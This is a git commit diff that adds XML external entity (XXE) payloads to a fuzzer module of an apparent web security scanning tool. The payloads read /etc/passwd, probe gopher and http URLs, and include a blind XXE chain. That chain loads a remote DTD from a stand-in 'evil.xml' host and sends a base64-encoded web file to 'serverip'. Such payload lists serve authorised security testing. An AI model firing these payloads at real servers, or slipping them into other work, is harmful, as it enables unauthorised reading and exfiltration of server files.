6602859a1f7399797235a168243390424ad6bce7
lyle <lilyui@126.com>
2018-12-13 13:25:48 +0800

    update xxe payloads

--- saker/fuzzers/xxe.py
+++ saker/fuzzers/xxe.py
@@ -3,9 +3,53 @@
 
 from saker.fuzzers.fuzzer import Fuzzer
 
+_payloads = [
+# test error version
+'''<xml version="abc" ?>''',
+'''<?xml version="1.0" ?>''',
+# test read file
+'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+%xxe;
+]>''',
+# test read file which not exists
+'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "file:///etc/passwdxxx" >
+%xxe;
+]>''',
+# test gopher protol
+'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "gopher://localhost/" >
+%xxe;
+]>''',
+# test http
+'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://localhost/" >
+%xxe;
+]>''',
+# blind xxe
+'''<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+<!ENTITY % remote SYSTEM "http://server/evil.xml">
+%remote;
+%all;
+]>
+<root>&send;</root>'''
+]
+_serverPayloads= [
+# blind xxe
+'''<!ENTITY % all "<!ENTITY send SYSTEM 'http://serverip/?file=%file;'>">'''
+]
+
 
 class XXE(Fuzzer):
 
     @staticmethod
     def test():
-        return '''<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd" > %xxe; ]>'''
+        for payload in _payloads:
+            yield payload
